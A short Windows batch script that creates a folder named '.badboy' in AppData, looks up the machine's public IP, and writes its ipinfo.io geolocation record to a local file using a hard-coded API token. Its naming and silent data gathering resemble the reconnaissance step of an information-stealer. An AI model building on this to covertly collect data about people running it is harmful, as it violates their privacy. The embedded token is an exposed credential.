@ECHO off

md %AppData%\.badboy

for /f "delims=" %%i in ('curl -s https://api.ipify.org') do for /f "delims=" %%a in ('curl -s ipinfo.io/%%i?token=a70e36470018f5') do echo %%a >> "data.json"
